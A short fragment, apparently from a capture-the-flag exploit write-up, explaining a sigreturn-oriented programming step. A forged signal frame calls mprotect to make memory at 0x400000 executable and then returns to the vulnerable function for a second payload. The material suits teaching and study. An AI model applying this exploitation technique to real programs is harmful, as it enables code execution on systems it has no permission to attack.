...
frame.rip = syscall
#Hey! Restore these registers:
#RAX = 10         → syscall = mprotect
#RDI = 0x400000   → where to make memory RWX
#RSI = 0x400000   → how much memory
#RDX = 0x7        → RWX permissions
#RSP = 0x4010d8   → so I can return to vuln and send next payload
#RIP = syscall    → immediately trigger mprotect syscall after return
